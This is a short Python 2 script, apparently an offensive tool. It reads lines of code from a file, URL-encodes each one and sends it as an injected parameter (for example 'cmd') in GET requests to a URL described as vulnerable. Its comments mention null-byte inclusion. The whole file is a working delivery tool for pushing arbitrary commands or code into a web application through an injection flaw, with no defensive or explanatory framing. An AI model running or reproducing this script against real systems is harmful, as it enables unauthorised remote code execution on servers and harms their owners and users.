import urllib
import requests
import argparse


parser = argparse.ArgumentParser()
parser.add_argument('-f', '--file', required=True, type=str, help='file with code to send')
parser.add_argument('-u', '--url', required=True, type=str, help='full vulnerable url (minus injected parameter')
parser.add_argument('-p', '--parameter', required=True, type=str, help='injected parameter (ex: cmd)')
parser.add_argument('-v', '--verbose', action='store_true', help='increased detail')
args = parser.parse_args()


with open(args.file, 'rb') as f:
    for line in f.readlines():
        # eliminate whitespace & newlines
        line = line.strip()
        tmp_url = args.url.split('&')
        if args.verbose:
            print 'VERBOSE: {0}'.format(tmp_url)
        # save end parameter separate, in case of null byte inclusion
        end_url = tmp_url.pop()
        if args.verbose:
            print 'VERBOSE: {0}'.format(end_url)
        # stitch url back together with &'s
        url = '&'.join(tmp_url)
        # strip leftmost &
        url = url.lstrip('&')
        if args.verbose:
            print 'VERBOSE: {0}'.format(url)
        # append the parameter + encoded line of code + last parameter
        url += '&{0}={1}&{2}'.format(args.parameter, urllib.quote_plus(line), end_url)
        if args.verbose:
            print 'VERBOSE: {0}'.format(url)
            print

        print 'sending: {0}'.format(url)
        r = requests.get(url)
        if r.status_code == 200:
            print 'Success!'
        else:
            print 'Error: {0} - {1}'.format(r.status_code, r.reason)
